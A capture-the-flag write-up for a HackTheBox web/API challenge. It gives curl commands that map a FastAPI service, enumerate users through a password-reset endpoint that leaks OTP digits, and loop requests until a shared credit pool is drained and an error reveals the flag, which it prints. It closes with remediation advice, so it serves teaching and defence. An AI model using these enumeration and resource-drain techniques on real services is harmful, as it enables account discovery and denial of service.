# SR Network — Web / API

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / API · **Result:** ✅ Solved
**Flag:** `HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}`
**Target:** `http://154.57.164.74:31412/`

---

## The short version

A website had a feature that quietly spent from a shared pool of "credits" every time it ran, and
nothing stopped me from running it over and over. Once I drained the pool to zero, the error
message the server returned handed me the flag.

## Background

"Star Forger Signal Relay," a **FastAPI** service. The scenario said an attacker was "rapidly
consuming the corporation's quantum credits" (the hint), and the brief said API docs were at
`/docs/`. FastAPI auto-generates docs, so the machine-readable spec at `/openapi.json` usually
hands over the whole attack surface.

## Every step, in order (exact commands)

**1 — Fingerprint the root.**

```bash
cd "$(cygpath "$TEMP")" 2>/dev/null; echo "=== ROOT ==="; curl -s -i --max-time 20 http://154.57.164.74:31412/ | head -40
```

→ `HTTP/1.1 307 Temporary Redirect`, `server: uvicorn`, `location: /login`. The `uvicorn` banner
confirmed FastAPI, so next I grabbed the spec.

**2 — Pull the OpenAPI spec and the login page.**

```bash
B=http://154.57.164.74:31412
echo "=== OPENAPI ==="; curl -s --max-time 20 $B/openapi.json | head -c 6000
echo; echo "=== LOGIN PAGE ==="; curl -s --max-time 20 $B/login | head -c 1500
```

The spec's title was "Star Forger Signal Relay," and the password-reset endpoint carried a
developer giveaway: *"One request consume 15 star token. **TODO: add proper rate limiting to
prevent star credit depletion.**"* That one line gave me both the flaw and the intended attack.

**3 — Dump the schemas (Python failed, so I used Node).**

```bash
B=http://154.57.164.74:31412
echo "=== SCHEMAS ==="; curl -s --max-time 20 $B/openapi.json | python -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d['components']['schemas'], indent=1))"
# -> "Python was not found..." (Store stub)
```

```bash
B=http://154.57.164.74:31412
curl -s --max-time 20 $B/openapi.json | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{let d=JSON.parse(s);console.log(JSON.stringify(d.components.schemas,null,1))})"
```

→ `PasswordResetRequest {identifier}` and `PasswordResetVerify {identifier, code, new_password}` —
so reset is completed with an OTP code.

**4 — Register a test account, log in, and read my own info.**

```bash
B=http://154.57.164.74:31412
U="relaytest$RANDOM"; P="Passw0rd!$RANDOM"
echo "USER=$U"
echo "=== REGISTER ==="; curl -s --max-time 20 -X POST $B/api/auth/register -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"$P\",\"display_name\":\"Test\"}"
echo; echo "=== LOGIN ==="; TOK=$(curl -s --max-time 20 -X POST $B/api/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"$P\"}")
echo "$TOK"
T=$(echo "$TOK" | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{try{console.log(JSON.parse(s).access_token||JSON.parse(s).token||'')}catch(e){console.log('')}})")
echo "TOKEN=$T" > /tmp/htb_tok
echo; echo "=== ME ==="; curl -s --max-time 20 $B/api/me -H "Authorization: Bearer $T"
echo; echo "=== DASHBOARD ==="; curl -s --max-time 20 $B/api/dashboard -H "Authorization: Bearer $T"
```

→ `{"message":"User registered successfully","user_id":2}`. Being **user id 2** implies a seeded
**user id 1** (admin) likely holds the flag. `/api/me` and `/api/dashboard` exposed no star balance,
so the flag was not on my account.

**5 — Probe the reset flow; discover the OTP + enumeration leaks.**

```bash
B=http://154.57.164.74:31412; source /tmp/htb_tok; T=$TOKEN
echo "=== RESET REQUEST (self) ==="; curl -s --max-time 20 -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d "{\"identifier\":\"relaytest12847\"}"
echo; echo "=== RESET REQUEST (admin) ==="; curl -s --max-time 20 -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d "{\"identifier\":\"admin\"}"
echo; echo "=== RESET VERIFY wrong code (self) ==="; curl -s --max-time 20 -X POST $B/api/auth/password/reset/verify -H 'Content-Type: application/json' -d "{\"identifier\":\"relaytest12847\",\"code\":\"000000\",\"new_password\":\"NewPass123!\"}"
echo; echo "=== DASHBOARD PAGE (star balance?) ==="; curl -s --max-time 20 $B/dashboard | grep -iE "star|token|credit|balance" | head -20
```

→ a real user returned `"code_hint":"Verification code starts with '9'"` (leaks the OTP's first
digit), while `admin` returned the generic `"If the identifier exists..."` (so the admin isn't
literally named "admin", and the endpoint is a user-enumeration oracle).

**6 — Chase the dashboard for a balance/target (dead ends).**

```bash
B=http://154.57.164.74:31412; source /tmp/htb_tok; T=$TOKEN
echo "=== static css listing attempt / js refs on dashboard ==="
curl -s --max-time 20 $B/dashboard -H "Authorization: Bearer $T" | grep -iE "src=|href=|fetch|/api/|/static/" | head -40
echo; echo "=== raw dashboard (first 2500) ==="
curl -s --max-time 20 $B/dashboard | head -c 2500
```

```bash
B=http://154.57.164.74:31412
for p in / /login /register /dashboard /beacons /profile /settings; do
  code=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 15 "$B$p")
  echo "$p -> $code"
done
echo "=== JS refs across login+register ==="
curl -s --max-time 20 $B/login    | grep -oiE '/static/[^"'"'"']+' | sort -u
curl -s --max-time 20 $B/register | grep -oiE '/static/[^"'"'"']+' | sort -u
```

The dashboard redirected to `/login` without auth; I worked out the session cookie name next.

**7 — Find the cookie name and read authenticated pages.**

```bash
B=http://154.57.164.74:31412; source /tmp/htb_tok
U="relaytest12847"
curl -s -c /tmp/htb_cj --max-time 20 -X POST $B/api/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"Passw0rd!12847\"}" >/dev/null 2>&1
echo "=== cookies ==="; cat /tmp/htb_cj 2>/dev/null | grep -v '^#'
echo "=== dashboard with bearer-as-cookie attempts ==="
for c in "session=$TOKEN" "access_token=$TOKEN" "token=$TOKEN"; do
  echo "--- $c ---"; curl -s --max-time 15 $B/dashboard -H "Cookie: $c" | head -c 120; echo
done
```

```bash
B=http://154.57.164.74:31412; source /tmp/htb_tok
C="access_token=$TOKEN"
echo "=== DASHBOARD interesting lines ==="
curl -s --max-time 20 $B/dashboard -H "Cookie: $C" | grep -iE "star|token|credit|balance|flag|admin|quantum|HTB" | head -40
echo; echo "=== inline fetch() calls on dashboard ==="
curl -s --max-time 20 $B/dashboard -H "Cookie: $C" | grep -oiE "fetch\([^)]*\)|/api/[a-z/_{}]+" | sort -u | head -40
```

The cookie was `access_token`, but the dashboard was just client-rendered user info — confirming the
flag lived on the privileged account, whose name I still needed.

**8 — Enumerate the admin name (this call drained the pool and won).**

```bash
B=http://154.57.164.74:31412
probe(){ r=$(curl -s --max-time 10 -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d "{\"identifier\":\"$1\"}"); echo "$1 :: $r"; }
for u in admin administrator root operator starforger star_forger celestial senate relay signalrelay system sysadmin forger quantum beacon support help dev test guest user1 admin1 overseer architect keeper warden; do probe "$u"; done
```

Every call spent **15 credits from the shared pool**. By the time the loop reached `relay`, the
pool hit zero and the response changed to the depleted state — leaking the key:

```
relay :: {"error":"Error: Company star credits depleted","status":"company_credits_empty",
"message":"Insufficient company star credits...","forge_signal_key":"HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}"}
```

The enumeration loop *was* the credit-drain attack: the vulnerability is a shared, global resource
spent by an endpoint anyone can hammer.

**9 — Submit the flag:** `HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}`.

## Technical detail

- **Stack:** FastAPI / `uvicorn`; Swagger at `/docs/`, spec at `/openapi.json`.
- **Vulnerable endpoint:** `POST /api/auth/password/reset/request` — unauthenticated, no rate limit,
  deducts 15 credits per call from a single global pool.
- **Information leak on failure:** the depleted-state response discloses the key.
- **Secondary issues:** user enumeration (differential responses) and partial OTP disclosure.

## Lessons / remediation

- Rate-limit and authenticate any endpoint that spends a shared/billable resource.
- Never put secrets in an error/failure response.
- Return uniform responses for valid vs invalid identifiers; never leak any part of an OTP.

## Tools used

- `curl` — recon, register/login, reset probing, the enumeration loop that drained the pool.
- `node` (inline) — to parse OpenAPI JSON and extract the access token (`python` was unavailable).
